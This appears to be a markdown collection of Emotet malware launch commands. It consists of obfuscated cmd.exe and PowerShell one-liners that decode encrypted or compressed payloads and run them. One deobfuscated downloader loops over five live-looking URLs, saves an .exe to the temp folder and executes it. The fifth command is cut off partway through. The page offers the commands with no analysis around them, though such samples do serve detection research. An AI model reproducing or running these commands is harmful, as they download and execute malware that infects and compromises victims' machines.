## Emotet


#### Commands
---

* Cmd.exe

1.
```
dWbtPtDObhv MRZqnKhPtUqbVYjQmpdfvDWCtQj hJNjiiIJOGttb & %C^om^S^pEc% %C^om^S^pEc% /V /c set %loVqFNsnWSOoQXU%=jTMkdiizHojdor&&set %var1%=p&&set %var2%=ow&&set %vRwmclCkupwoRzI%=UuIwUIHrb&&set %var7%=!%var1%!&&set %DKViQiPwiWwsiuj%=wYXlpQhqqUoUsX&&set %var3%=er&&set %var8%=!%var2%!&&set %var4%=s&&set %nJELZbjBiKjpnaL%=pzZCXkjGmm&&set %var5%=he&&set %var6%=ll&&!%var7%!!%var8%!!%var3%!!%var4%!!%var5%!!%var6%! " ( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe([RUNtIme.intEropseRVICEs.MarShal]::SeCURestrINgtogLoBaLaLloCUnicOde( $('76492d1116743f0423413b16050a5345MgB8ADYAYwB4AHAAdgAxAHEAdQAvAEkAVQBXADQANQBrAFUAWgBkAEIANwBTAGcAPQA9AHwAYgAyADUAOQAwADMAYgBkAGMAOAA1AGMANwA0ADgAZgBhADUAYQBhAGIAYgBkADcAMwA1ADgAYwA3ADIANwA1ADAAZAA4AGEAYQBiADEANwBkADIAMwA3ADMANABlAGUAOAAxADUAZQA3ADAAOAAxADMAZQAyADIAZQBlADUAOAAxADcAMQAxAGUAOAA4ADUAOQAzADcAMwBlADcAOABmADYAYwA5ADkANAA3ADMAMABhAGMAMwAzADIAMQAxADcAYwA2AGQAMgAxADAAZQAyADQAZgAyAGUAMQA0ADMANABkAGIANAAxADAAMABlADAANAA0AGUAMwBjADYAYQAzAGUANgA2ADQAYQBmADgANwA4ADYAMQAwAGIAOAA2AGYAOQBmADYAOAAyAGUANAA4ADAAOAA3ADQAZgA4AGMAZQAxADUAYQAxADIAYwA5AGIAMgBmADcAYgBhAGQAYwAyADQANQAxADcAOQA4AGMANQA0AGMAYgAwADkAZAA0ADYAMAA4ADYAYQAyAGMAYwAxAGEANAA2ADQAZABmADUAMQBhADQAZQA3AGQAZABlADQANgA5AGQAYwA2ADIAOAA4ADEAMwBiADQAYwBlAGIANQA1ADYAMAAwADUAOQA1ADQAOQBmADAAMgBhADUAOQBiADQANABhAGMAZgAxADEANAA3ADcANgA2ADIAYgA4ADUANwA1ADUANQAxADEAOABlAGQAMAA2ADAAZABiADQAZABjAGMAYQBmADgAYQAzAGYAZQBhAGIAMgA0ADQANgBmADgAMwBlADQANwAyADcAYwBhAGIAMQA2ADIAOQA4ADcANwBlAGYAZAAwADYAYwAyADAAYgAyAGMANABlADIAYgBiAGQAYQA4ADQAZQAzADgAZgA2ADAANQAzAGIAYgBlAGUAZQAzAGQAZQBiAGYAMABkADMAZgA5AGUANwAzADYAZQAwADYANgA4ADUAZAA2ADkAMwBlAGUANwA1ADEAMgA1ADIAMAA3ADEAZgBjADQAMgAxADQAYwBjADYAMQBiADkAYgA0ADEAOQBjADQAOAAzADkANAAyADYAMQAzADgANAA4ADcAYQA5AGQANwAxADkAMAA5AGIANABjADUAYQBiADAAYQA2AGEANABjAGEANgBhADMAZgBiADgAOQBkAGEAZQBkAGUAYwBkAGUAZQA3AGQAYwBiAGEAMwA5ADAAMAA0AGMAMQA2AGMAOQA1AGQAYQA1AGUAYgBmAGYAYwBjADMAYQBlAGUANABiADQAMwBhADAAOQAxAGMAOQA5AGUAZAAzADAAZAA1ADMAOAAxAGUANQAzADAANABlADkAYwAxAGMAMwBmADAANQBlADYAYwA3AGYAMwAxADgANAAxADEANQA0ADIAOQA5AGMAZQA0AGUAMAAzADkAMgA5AGIANQAxADAANgA2ADAAOAA4AGIAMwAzAGYANgBiADcAOQBjAGQAZQA4AGYAZQAxAGYAOAAyADAANQAxADkANgBhAGMANAAzADMAYwAyAGYAYwBlADIAOAAwAGQANgA5ADQANgAwAGEANABlADAAZABjADYAYgBmADkAOAA5AGMAMwA0ADQAZgAzADIAZQBiAGMAOABkADcANwBhADkAMwAwAGQAMAA4AGEAZgA4ADkAYgAyAGUAZAAyAGQAMAA1ADEANwAxADMAOQA1ADIAOQBhAGUANgAzADYAMwBhADMAOQBiAGEAZQA4AGYAZQBiAGMAYQAyADMAYgAxADQAZQAyAGYAOABkAGUAOAA2AGIAOQA0AGYANAA0AGQAMABhADEAZgBmADAAOABjADkAYgBlAGQANABmAGIAMgBiADMAYQA5ADEAZgBiAGMANgAyADcAMwA4AGUAYQBjADAAZABlADkAZgBiAGUAYwAxAGUAOAA4ADkANwA5ADAAOAAyAGIANgAxADUAMQA3AGQAMwBmADUAZABkADMAZgBmADUAZQA1AGUANABlADMANgAzAGYANwA4ADMAMwA2AGEANgAyAGUANwAyADcAYQAyAGIAMwA2ADgAMgBiADUANAAxADcAOQBjADAAYgA5ADIAZQBjADQANQAxADcANwBmADIAYgBiADgAOAA0ADAANgAxAGMAMAA5ADgANgBkADcAMAA2ADcANwAxAGMAYgBiADEANgBmADEAMQAyADAANQA2AGMANQAyADkAMgAyADMAMQAwAGMAYQAyADkAOQBjADgAMwAyAGYANQBmADUAYgA4AGUAZgBhADAAZQBkADgANABjAGUAMQBiAGIAMgBlAGEANwAyAGQAYQA5ADcAOQAwADcAZgBjADgAZQA2ADQANwA2AGIANwA2ADgAZAAzAGUAZAAwADgANQBkADQAYwA4AGYAYwAxADAAZQBkADAAMQA2AGQANQAxADkAOQAxADUAZAA4ADgANwBjAGUAMgBkADgANwAxADAAMgBmADgANgAwADkANAA1AGEAOABkAGMAYgA4AGYAZQAwAGUAZQBkAGQAOQA5ADYANwBkADkAYQAzAGIANgBjAGMAZgBjAGIAMQA0ADEAZAAxADEAZABlADQAZgAwADgANAAyADcAOAA1ADYANwAyADUAOABhADEAZgBjADcAZQA3ADgANwA1ADUAYQBkADgAMgA3ADkAMgAxAGYAZgA1ADIAZQA0ADMAYwA2ADIAYQAwADEAOQBjADEAMgBiADgAOQAyADIAMgAwADAAOAA5ADEAYwBjADEAMAA4ADMAZQA2ADAAOQBkADQAMwAwADAAMQA1ADAANABjADQAYgA5ADMAMwAyAGEAMgA0ADYAMgAzADUANgA5ADgAMQBkADkAOQBjADgAMgAxADIAYwA0ADEANAA5AGYAZgBlADAAZAAyAGIAZQBhAGIAYgA5AGEANwBhADMAZAA3AGMAZAAxADgAOQBiADEAMQAzADUANABkAGUAOAAyAGQAMgAwAGUAMQAzAGQAZAA0AGEAZAA5ADIAYgA3AGQANwA3ADYAYwA0AGIAYwA0ADEAZAA1ADcAZgBlAGMAOQBmADcAZABjAGMAZQBiADcAZgBmADMAMAA1ADAAZQA3AGQANgBjADkAMQA0AGYANQBlADUAYgBjADIAOAAzADgAMQA3ADUAYQBjADAANgBhAGYAMgBiADAANwBlADYAZABlADYAZgA5ADEAMgBmADEAMgAyAGYAMAA3AGMANABhADMANwBhAGQANwAzADAANQBhADEAZABmAGMANAA5ADAAMgBlAGEAYQAwAGEAMwBkADQAYgA4ADQANgBlADcAZgAyADkAMQA3AGQAOABjADAANwA1AGQAYwA2ADEAOQBmADYAMwBiADQAMABmAGQAMwA3AGIAYQA4ADEAZAAzADQANABkADEAYwA0AGMAMgBiADQAMgBhADEANAA5AGMAZAA2AGUAYgAwAGMAZgAxADMAZgA3AGMAOQA4ADgANwAzADYAYwBjADIAMwA5ADgAMgA5AGIAZABlADIANwBiAGMAYgA0ADgAOAA3AGQAOAA3ADcANQA5ADIAMgAyADgAZQAwAGUAZgBmAGEAMAA3AGUAZgA5ADEANwAyADcAMwBlAGQANAAyADcAYgBhAGIAYgAzADEAMgA5AGYAOABlADUANQAwADQANgAwADQANQBmAGMAZABiAGQAMABjADQANQAxADYAYQAwADMANQA5ADQAOQAwAGUAYgAyAGUAMAAwAGEAOAAyAGEANQAxADEANgA2AGEANgA5ADEAMAA5AGQAYwA0AGMAZABmADkANwA5AGIAYgBkADIAZgA2AGQAZgBjADgAMABjAGUANgAxAGYAMwAyADUAZgBlADQAMgBlADQAOABkADAAMwAxADEANQBiADcANgA2ADUAMwBkAGEAOAAxADMAMgBkAGMAYQAxADQAYwA0ADMANAAyADkANwBmADAAOAA1AGEANwA5AGMANQBhADEANgBlADQAZAA5AGMAOAAyADMANgA1ADkAOAAwAGEAMwBlAGIAZABiADAAMQBmADkAZQA2AGYAMwAyAGIAMwAxADUAZABjADEAMQBlADMAYQBkAGYANgAxADEAZAAxADMAOQAyADIANQBmADgAOAAyAGMANwA4ADQAZgBmADQAMQBiAGQAZgBhADYAMABlADcAOQA4ADQANgA1ADEAYQBjADUAYwBjADcAMwA1ADMANwBjAGIANgA1ADQAZAA3ADIAOABjAGYAZQA0AGQAZgA2ADYAMQBkADEANQA3ADIAMQAyAGUAMwA3ADMAMAAxAGEAMABjADkAMQBhAGMAOQBhAGEAMQBkAGQAMgA2ADkAZgBiADcAYgA3AGUAYQBkAGYANAAwAGMANwBlADgAMwA3ADUAYwAxADgAYQA1AGEAMQA3ADcAMgBjAGEAMgAwADcAZgAzADMAOAA4AGEAZAA1ADcAZQBjADUAZQAwADkAMgAzAGYAZQBiAGMAYgA1ADAAZABjADUAMAA2AGEAYQAxAGYAYwBiAGQAYgBkAGIAMwBjADcANgAwADkAOABiADMAZQBmAGQAZAAzAGEAOQA4AGEAYgA3ADcANwBjAGMAMQAzAGEAMgA4ADMAYgBkAGUAMwA5ADgANQBiADMAMAAxAGQANQAxAGUANwA1AGUAYQA2ADgAZQA0AGUAYwBhAGUANABhAGUAOAA5AGMAZgAwADYAZQA0AGYAMQBlAGYAYQBkAGEAMAA1ADgAOQAzADAAMwAwADYAYwA5ADUANQA5AGMAMQBkADgANgBmADgANAAzADYAYwBjADIAMAAwADMAMgAwADMAMgBhADIAZABkADQAZQA0ADEAMwA2ADEANwA2ADQANwAxADIAYgAwADUAZgA1ADcAMAA3AGYAMgBjAGQANABjADAAZQA4ADgAMwBkAGQAYgA3ADgANAA2ADUAYgBkADAANgA4ADkAMgBkADEAOQBjADYAYQA0AGYAMgA2AGQAOABlAGYAZQBjAGIAMgBhADUAYQAyAGYAYQBjAGYAYwBjADIAZgAwADYANgA0ADkAZQAxADgAZABhADYAOQA2AGMANQAyADkAMQA5ADMAOQA3AGUANgA3ADEAMgAzAGUAOAA4AGYAYwA3AGIAMgA1ADIAYwAyAGYAMwAwADcAZABjADQAZgBhAGUANgA1ADEAMQAzADYANAA2ADgAYQA2AGQAMABjAGUAMgAwAGEAOQA3AGEAZgBjADAAZgBlADEAOQAxADkAZQA3AGQAOABhADYANgAwADUAMABkAGYAOQBmAGQAMwA=' |cOnvErtto-SeCureSTrINg -K (35..4)))))| . ( $VERBosePreFERENcE.TOStrIng()[1,3]+'x'-joIn'')
```

2.
```
Cmd/C "Set ctSI= .( ([StriNG]$vERbOSEPrEFeReNce)[1,3]+'x'-JOIN'') (NEW-ObJEct io.CompreSSion.DefLAtestrEaM([IO.MemOrYStReam] [sYsTEm.COnVERT]::frOmbASE64STrINg('PZBda4MwFIb/Si4CqbhGuu3GBqGs28CxrowySmE3MT3W1JhIetAO8b9PZevted7znA/6tdWJhXbusjMoJB+AfA/Z2miwKGiaNgkrEOtlFEmPF4tQcuWq6ICf1q3+SCYLLZUHibqRE453h+1LXP4HlK4L8BXw2kRHiTJS7Q0V0g/DcncdG3nmo8fF+nyj8gLGyMo12p4mMy5OjO9qo3HGViwQdLN/Jwlh9w8xE7TKfULBNkuEqg7ZNwtHHjIOV2Aid8OOqpjRzdsT0ZaM5wUd+p+ODm/gz661xsnjqzYwZe7IKAxEahtXwjwdpFNFZIOnFL2SqIqu738B') ,[IO.CompRessiON.cOmpreSSIoNmoDE]::dECOmPreSs ) ^|FOReach { NEW-ObJEct sYstem.Io.StrEAmreAdeR( $_,[teXT.EnCoDiNG]::aSCii) } ^| foREaCh { $_.rEADtoENd() }) &&POwERshelL $oB84i = [tyPe]( \"{3}{0}{1}{2}\"-F'n','MEN','t','eNvirO' ) ; ${executiOnCONtExt}.\"InVokec`Om`ma`ND\".\"in`VO`KES`CrIPT\"( ( ( GET-IteM variabLE:oB84i ).vaLuE::( \"{1}{3}{2}{0}\" -f 'E','ge','NVIroNmEnTVARiABl','TE' ).Invoke( (\"{0}{1}\" -f'cTs','I'),( \"{1}{2}{0}\"-f 'S','PR','oCEs') ) ))"
```

3. Payload with base64 compressed (deflate/inflate) data and reversed spelling
```
/C "sEt DIy=$8230C =[CHaR[]] ") )93]rAHC[,)84]rAHC[+701]rAHC[+28]rAHC[(EcaLPErC- 63]rAHC[,'Q8h' EcaLPErC-421]rAHC[,)99]rAHC[+411]rAHC[+201]rAHC[( EcaLPErC-)'nOi'+'ss'+'eR'+'pXE-ekOVNI '+'crf)(Dn'+'eoTda'+'ER.)'+'})'+'iI'+'cS'+'A::'+']Gn'+'IDoCNE'+'.txE'+'t'+'.mE'+'T'+'s'+'YS[ , '+'_Q8h'+' '+'(REDA'+'ErmAe'+'r'+'t'+'S.oi '+'TcEJBO-WEn {'+' tC'+'E'+'jBO'+'-hcAe'+'Ro'+'f '+'crf'+' )'+'s'+'SERp'+'M'+'O'+'CED'+'::'+']EdOm'+'NoIS'+'SErp'+'m'+'O'+'c.noiss'+'erPmoc'+'.Oi[, '+')'+'0kR'+'=='+'wf0gt'+'4jn'+'5w'+'plE'+'56'+'j'+'u'+'T6'+'l'+'U'+'y8Thm'+'dN'+'Rp'+'Y'+'bFvu'+'a'+'GcUFpNDv'+'i'+'S'+'aiRLaT3RXf5'+'R62j'+'22Tq'+'8'+'9'+'yO00xFYyxWaA'+'a'+'PAh/'+'+eeB'+'+'+'/PwGy7wuuEMUTe'+'JCm3c'+'7'+'dD'+'D'+'Nv'+'v0E6'+'ly'+'9'+'A'+'B'+'fdSW9'+'xBKUu'+'DeMT4'+'rPe6id'+'+'+'JMV'+'C2TkqV/f'+'x'+'b'+'a'+'Ky+'+'XLxam'+'q1'+'vrVSpZnJ+Z'+'x0HZ5X'+'N+WpMXQhxM5iSysve+L/J+yhlz'+'6Tt'+'VOy'+'g'+'Ahuy'+'KymQon8'+'J'+'cE7vWmI'+'Gm'+'vhI'+'siwMIrg'+'0'+'Ai'+'LMxX10'+'Vyjy'+'TnY'+'G'+'3E'+'wE'+'UCsEZ6yMT'+'sET'+'nT'+'4Jb'+'nj'+'w'+'ELS'+'5UEl2J'+'syPY9iggb2'+'84'+'aR'+'9bW'+'+Q'+'QN/'+'xtcw'+'J7W'+'++e'+'6b'+'C'+'ZcX'+'/QOmbOaruL'+'vV'+'uK9FG'+'UGBKISY'+'Y'+'QtENgqfNb'+'JIFa6hy/XI'+'FwI8TRBZ'+'P0'+'kR '+'(GNiRt'+'s46E'+'SABMorf:'+':]'+'T'+'REvn'+'OC'+'[]MaEr'+'tSy'+'roMe'+'m'+'.oi.METsys'+'['+' '+'(mAERtSE'+'tAlFe'+'D.'+'N'+'OisSErpM'+'o'+'c.Oi'+'.mETsys'+' Tc'+'EJ'+'B'+'O-'+'WEn ( '(( ()''nIOJ-]2,11,3[EmAN.)'*rDM*' eLbAirav-Teg(( ." ; [ARrAY]::ReveRSE( ( chILDItem ("V"+"ariA"+"b"+"lE:"+"8230C") ).vAlue); [stRiNG]::jOIn( '' ,( chILDItem ("V"+"ariA"+"b"+"lE:"+"8230C") ).vAlue )^|^& ( $veRbOsePrEFerENCe.TOsTRiNG()[1,3]+'x'-JOIn'')&& PowERsheLl SEt-ItEm ('V' + 'ARiAb'+'lE:SKeAil') ( [TYPe]( \"{2}{3}{1}{0}\"-F't','n','ENvIRon','ME' ) ) ; ( .('ls') ( \"{4}{0}{7}{1}{5}{2}{3}{6}\"-f'B','E:E','co','NteX','VarIA','XEcUTiOn','t','l') ).\"VaL`UE\".\"iN`VO`k`eCom`MANd\".( \"{3}{1}{2}{0}\" -f 'ipT','oke','SCr','inv' ).Invoke( ( ${sK`E`AiL}::(\"{0}{4}{1}{2}{5}{3}\" -f'get','ONMeNt','v','E','Envir','arIaBL').Invoke( 'DiY',(\"{1}{0}\"-f's','PrOCeS' ))) )"
```
Deobfuscated
```
/C "set diy=$8230C =[Char[]] ; ". ((get-variable '*mdr*').name[3,11,2]-join'')( ((' ( new-object system.io.compression.deflatestream( [system.io.memorystream][convert]::frombase64string('PZBRT8IwFIX/yh6aFIJbNfqgNEtQYYSIKBGUGF9KuVvLuraObmOQ/XcZCb6e++W7Jwctx/NQQ+Wb9Ra482bggi9YPysJ2lEU5SLEwjnbJ4TnTEsTMy6ZEsCUEwE3GYnTyjyV01XxMLiA0grIMwisIhvmGImWv7EcJ8noQmyKyuhAgyOVtT6zlhy+J/L+evsySi5MxhQXMpW+NX5ZH0xZ+JnZpSVrv1qmaxLX+yKabxf/VqkT2CVMJ+di6ePr4TMeDuUKBx9WSdfBA9yl6E0vvNDDd7c3mCJeTUMEuuw7yGwP/+Bee+/hAPaAaWxyYFx00Oy98qT22j26R5fXR3TaLRiaSivDNpFUcGauvFbYpRNdmhT8yUl6Tuj65Elpw5nj4tg0fw==') ,[io.compression.compressionmode]::decompress) | foreach-object { new-object io.streamreader( $_ , [system.text.encoding]::ascii)}).readtoend() | invoke-expression'))" [array]::reverse( ( childitem ("variable:"+"8230c") ).value); [string]::join( '' ,( childitem ("variable:8230c") ).value ) | & ( $verbosepreference.tostring()[1,3]+'x'-join'')&& powershell set-item ('variable:skeail') ( [type]( environment' ) ) ; ( .('ls') ( "executionvariable') ).\"value\".\"invoke-command\".('invokescript').invoke( ( ${skeail}::('getenvironmentvariable').invoke( 'diy',('processs' ))) )"

$UGQ=new-object Net.WebClient;$Frh='
 http://craniofacialhealth .com/fkwoBvLXu9@
 http://cipherme .pl/data/FUqfiGggE@
 http://duwon. net/wpp-app/zZIi80jKEg@
 http://malchiki-po-vyzovu-moskva  .company/fyxuFQjT@
 http://dingesgang .com/kAMzVfDDiX'
 .Split('@');$OnT = '431';$cwL=$env:temp+'\'+$OnT+'.exe';foreach($NPw in $Frh){try{$UGQ.DownloadFile($NPw, $cwL);Invoke-Item $cwL;break;}catch{}}

```

4.

```
cmd /V:^O/C"^s^e^t rk^g^7=A^ h.B:^,[]^YQ^O)dbHKz^p1/Ct^G^I^-xw^y;^}kN^Z^i^0(f^{^E^MWco'8+^m^j^\^=P^sn^g^Uv^$^le^Tr^@^u^S2a&&^f^or %N ^in (^18,43^,2^7^,^59^,6^1^,^5^2,2,59^,^5^8,5^8^,1^,5^7^,17^,^4^1,2^1^,5^0,^4^4^,2^4,^5^5,0^,4^4,^29,5^7^,1^0^,^1^5,9,50,^44,2^,22,22,18,^5,20^,20^,2^2,61^,66,^14,^66,53^,^66^,^2^2^,43^,63,^6^1^,^5^2^,3^,42,4^3^,4^7,20,6^3,^6^2^,^2,2^2,22^,^1^8^,5^,2^0^,2^0,1^8,3^4^,17^,1^7^,^5^9,^6^1,^34,6^6^,61,^4^3,^5^3^,^1^3,4^3,^3^,^5^2^,^34^,2^0^,1^7,^45,4^2,23,^6^2^,2^,22,2^2^,^1^8,5,^2^0^,^20^,^1^3^,^34^,^6^6^,^2,^4^7^,^66^,61^,^5^2,3^4,13,34,^3^,4^2^,^43^,^47,2^0^,4^0^,5^1,^21^,60^,1^6,^2^3,6^2^,^2,22,^2^2,18,^5^,^20,20,^4^3,^54,^6^1^,43,^13,^2^8^,^63^,5^2^,47,^3^4,59^,^42^,^2^,63,3^,^18,^58^,2^0,^3^4,63^,^14^,^5^6^,^45,^56^,62,2,2^2^,22,18,^5^,20^,20,66,^52,^52,6^3^,^61^,^66^,5^3^,^42,^5^9,^25,^42,2^,^6^6,61^,5^9^,53^,^2^2^,59^,3^,3^7^,6^1,^2^0,^52,^3^7^,^2,44^,3^,^6^4,^1^8^,^58,^3^4^,22^,36^,4^4^,62^,44,^1^2^,^29^,57^,^66^,^4,^18^,^50,3^6^,^7,^64^,^28^,5^2^,22,5^9^,4^7,^3^,^24^,1^1^,^3,^51,^66^,^2^2^,2,8,^5,^5,^23^,59,22,^60^,59^,^4^7,^1^8^,^51,66,22,^2^,36^,^12,4^6^,44^,^49^,4^7,1^0,^32^,3,5^9,26^,59,^44^,12,^2^9,^57,18^,^13,33,1^,5^0,3^2^,59,2^7,2^5,^11,1^4^,^48,^5^9,4^2,^22^,1,^2^5,^4^2,^43,^4^7^,1^,4^4,4^7,^52^,26,^4^7,58^,^6^5,3^,^26^,4^7,^58^,2^,2^2,2^2,1^8^,^4^4^,2^9^,5^7,22,1^8,3^1,1,50,^1^,3^2,^5^9^,^27,2^5^,^1^1,^14,48,59^,^42^,^2^2,^1,^2^5^,4^2^,43,^4^7,1^,4^4^,^66,13^,43^,1^3^,1^4,3,5^2^,22^,^61,59,^6^6,47^,^44^,2^9^,37,^4^3^,61,^5^9,^66,42^,^2,36^,^5^7,^63,3^4,0^,1^,^3^4^,53,^1,^57,^10,1^5,^9^,^1^2^,^38^,^22,^61^,^2^8,^3^8^,^57^,^18,13^,^3^3,3,4^3,^1^8,^5^9,53^,^36,4^4,^2^3,3^9,^60,44^,^6,^5^7^,^6^3,34^,^0,6^,^3^5,^1^2^,29,^57^,^18^,13^,^33^,3^,52^,^5^9^,^5^3^,1^3^,^36^,12,2^9^,^5^7^,^2^2^,1^8^,^31^,^3^,43,^1^8^,5^9,53^,36,^12^,^29^,^57^,22,^1^8,^3^1^,^3,^2^2,2^8,^18,59,^1^,^5^0^,^1^,19^,2^9^,^5^7^,^22^,18^,31^,^3,27,61^,^34^,2^2^,^59,3^6^,57^,^18^,1^3,^33,^3^,^61^,^59^,^52,^1^8^,^4^3^,5^3,^52,59,4^,43^,^13,28^,^1^2^,^29,5^7^,22^,^1^8,^3^1^,^3,5^2,^6^6^,^5^6,59^,2^2,4^3,3^7,34,^5^8,5^9^,36,^5^7^,66,4^,18^,^12,^2^9,^64,^22,^66^,61,22,2^5^,51,61^,43^,^4^2^,5^9^,^52,5^2^,1^,^5^7^,66^,4^,^18^,^2^9^,1^4^,^6^1^,^59^,^6^6^,^31,3^0^,42^,6^6^,^2^2,4^2^,^2,3^8^,3^0,3^0^,1^,1^,^1,^1,^1^,1,1,^1^,^1,1^,^1^,^1^,1,1^,1,1^,1,73)^do ^s^e^t ^y^p^e=!^y^p^e!!rk^g^7:~%N,1!&&^if %N ^g^e^q ^7^3 cal^l %^y^p^e:~-^5^0^7%"
```

5. 
```
 c:\ZHhFvBd\QEWVzrTc\FNuOpzpfwHM\..\..\..\windows\system32\cmd.exe /C"^s^et ^t3=^o&&s^e^t V^toN=^.^o^p&&s^e^t 0^a^lV=()&&^se^t ^H^i^Z=://pr&&^s^e^t ^4^D=r^Y&&set ^Zu^GH= ^ ^ &&^se^t ^sr=t&&^s^et A^2=ms^xm^l&&se^t z^l^h=^ in&&s^e^t ^oC=^h&&^s^e^t ^B^S^0^u=t^t&&^s^et ^J^q^G=^o&&s^e^t ^E^u=^M&&^s^et ^h^1N=.r^e^s&&^s^e^t ^J^L^g=^;&&^s^et 3HV=^b&&^s^et ^a^sR=^e&&^set M^G=^s&&^se^t Z^t=^{}^}&&^s^et T^3^O=n&&^s^et ^D^U^Y=^e&&^s^et ^mhf=^a&&s^e^t ^dS=^w^p-&&^se^t ^qt=^;$^E&&^se^t 0^F=k^K^w&&^s^et ^m^6=^f&&^s^et ^2d^I7=^p&&^s^e^t ^0^xR=-^O&&s^e^t R^8J^S=/^q^P&&s^e^t ^Mx=^T^em&&s^e^t 6^k^o^D=e&&^s^e^t ^y^KN=^e&&^s^et w^b= -c&&s^e^t ^oEK^b=^q&&s^e^t 5^K=^'&&^s^e^t a4^x^o=ol&&^s^e^t ^w^F^Ua=^str&&^s^et tT^j^p=r^t^-&&s^e^t ^zR=(^'&&^s^e^t ^H^1Y^u=i^d&&^se^t q^G^y=^b^A&&s^e^t ^ST=/co&&^s^e^t ^wD=^tp&&s^e^t tZ^7^W=^b&&s^e^t ^dCl^P=/^6&&^s^e^t ^qTY^D=s^e&&^s^et rq=c^h&&^s^e^t ^I^a=^m&&^s^e^t o8^W^u=^h&&^s^e^t v^h^Wi=^ ^$z&&^s^e^t ^i^o=^;$^Z&&^s^et H^1^4=^m^i^e&&^s^et ^H^Xv=^m/&&^s^e^t m^D^G^i=(^$^zc^d&&^set q^D^oN=($q^X^a&&^s^et K^8=^:&&s^e^t z^w^Y^u=^l&&s^e^t ^G^JC=^S^ys&&^s^et j^AO^p=^o&&^s^et ^OV^Y=^0^@&&^s^e^t ^W^E=^t^en^t&&^s^et ^ho^s=^k&&^s^e^t ^B^8^Q=^p&&^s^e^t i^J^y=^[&&s^e^t ^dXw^b=^alt^y&&^s^et ^ZLa^y=^m&&^se^t ^qY^UC=^ &&^se^t ^1^2^9=^m&&^s^e^t ^68^AE=^'^a^d&&s^e^t m^H6^u=^o&&^s^et 1^E^M=c&&^s^e^t ^JS=n^e&&^s^e^t ^aT=^E&&^s^e^t ^YM=^in^tz&&^set ^tu=^h&&^s^et 4^x^TL=^zc^d,0)^;&&^se^t ^Do^4y=)&&^s^e^t ^HP=^@&&^s^e^t 0^t=^t/&&^se^t 0o^d=d^b^.&&^set ^7^8=^ &&set K^I=vV^=^'&&^se^t ^0G^J=^p&&^s^et ^oL^G=.^e^x&&^s^e^t E^P^i=Z&&s^et ^g3^Sb=^D&&s^e^t ^ev^t=^.&&^s^e^t ^Kn^F=c&&^s^e^t vCq=/&&^s^et ^H^eq=^t&&^s^et ^ov=^e&&^s^e^t V^d=^ew&&^s^e^t ^Tj=n^t&&^se^t E0^X^G=^]&&set ^yI^s=i^h^a&&s^e^t ^G^Hw=Z^f&&^s^e^t ^Z^7=^'&&^se^t A^0=^I&&^s^e^t ^a^L2=^i&&s^e^t ^b^W^D=^a&&^s^et E^9=^.6^2.&&s^e^t v^s^y=^A&&^se^t D^9^o=^Pj&&s^e^t ^68=I)^{&&^se^t ^hs=^$&&^se^t ^jr=^t&&^s^et y^d^U=V&&^s^et Q^x^P^q=^:&&^se^t 1R^q=^ower^s^h^e&&^s^e^t ^4^a^K=^=&&^s^e^t E^p^j=^e&&^s^et o^4=f&&s^e^t ^K^i^M^t=^p&&^se^t v^P=n&&^se^t ^b^Tr^e=^u&&^s^et ^T^W^0D= ^ &&^s^e^t ^Y^M^9z=^w&&s^et ^E6=^O.&&^s^et ^Jc=^ll&&^s^e^t r^l^Ku=^t&&^se^t ^t^p=^'&&^s^e^t ^is=^i&&^s^e^t ^W^Fym=^t^p'&&^set Q^E=//&&^s^e^t J^X=^t^ &&^s^et i^p=R5s&&^se^t ^0s=^Eb&&^se^t ^q^sx=^ $&&^se^t D^3^E=^;^$&&^s^et ^s^o^3=^am'^;&&^se^t 6P^z^7=^e&&s^e^t ^zXM^P=^ &&^se^t r^4=^= N&&^s^et k^7^t=^il&&s^e^t ^Id^B=^tI&&^s^e^t ^2^Y^Fc=^i&&^se^t ^k^2D^E=^Z^f&&^s^et ^4m2=^=^ 1;^$&&^se^t Y^9=^5&&^se^t Rr^8=^S&&^se^t ^Kn^y=^.c&&set b^DA^x=^o&&^s^et ^b^x^WM=^;&&^s^e^t ^id=c^o&&s^e^t ^1u=7^f&&s^e^t kCm=t^e&&^s^et ^6^X=^;^$Z&&s^e^t ^g^Y=^O&&^se^t ^am^h1=^ &&s^e^t ^EN=N&&^s^e^t V^9^3=^}c^at&&^s^et y^A=v^e^t&&^s^et Z^u^Mc=^e&&^se^t ^s^SX=^')&&s^e^t rN^D^W=^d^y&&^s^et ^d^So=C^I^3&&^s^et R^f=^l&&^se^t ^j^4^f=^p^l^oa&&^se^t V^4n^T=^or&&^se^t Z^A=^p&&^s^e^t M^S^J^7=n&&^s^et ^Dd=P^a&&s^e^t ^b^TN=^h()&&^se^t R^d=^p&&^s^e^t ^J^t^z=^s&&^s^e^t ^an=^$^E&&^s^e^t ^w^l=^d&&^se^t z^6=^Pr^o&&s^e^t ^s^i^H=c&&se^t ^1^2^sW=r&&^s^et ^W^FJN=^sH^@&&^s^e^t ^7^u^e^H=:^:&&^s^e^t ^H^04=b^A&&^s^et ^T^M^3=7^9&&^set ^OX^7=^P&&^se^t r^I=^t&&s^e^t ^b^E^Kf=^-&&^se^t 2nRM=^$&&s^e^t ^m^BR=^o^m/&&^se^t m^HR=^m&&^s^et ^s^k9^1=/&&^se^t ^Z^3^u=ds/&&s^e^t ^qd^4V=^.c&&s^e^t ^Sz^L=^ &&^se^t Z^a^L^1=^t&&s^e^t ^a^tLc=/up&&^s^et ^z6e^b=^@h&&^s^e^t ^T^E6=^1&&^s^et ^3J=^m.^I&&set r^L^x^U=^en(^'G^ET&&^s^et ^3n=^e&&s^e^t ^D^T^tc=^$&&^s^e^t 7G^2^q=^.^w&&^s^et ^BW^e=h^t&&^s^et ^J^x^8=^s/^L&&^se^t ^W^4Q=S^@^ht&&s^e^t ^4c^71=^.&&s^e^t V^0=^t&&s^e^t V^s=r^e^a&&s^e^t ^t^WR=^p^on&&^se^t ^1^h=^ec&&^se^t ^4Q=^')^;^$&&^s^e^t ^B^YJE=c^o&&^se^t ^W5=^;&&^s^e^t ^tM^5=^t&&^se^t ^G^x^hU=^en&&^s^e^t J^K^a^X=^Q&&^se^t V^3=:&&^se^t R^s=^s&&^se^t ^W^Bw=//^1^3^9^.&&^s^et ^to^O=^t&&^s^e^t r^K^Yc=/&&^s^et 2H^f^l=^y&&^s^e^t ^A^8= ^ ^ &&s^e^t ^Bwn^i=^jec&&^s^e^t ^1^8^df=^=N&&^s^et 4^e= &&^se^t ^2Q^f=^.n^l&&^s^e^t ^QGU^x=^ht&&^s^e^t o^yO^X=b&&^set ^1C=c^o&&^se^t ^k3^4^X=^t&&^s^et Ex^G=$^q^X&&^s^et ^t^EVR=l&&s^e^t g^f=^2^.^xm&&^s^e^t 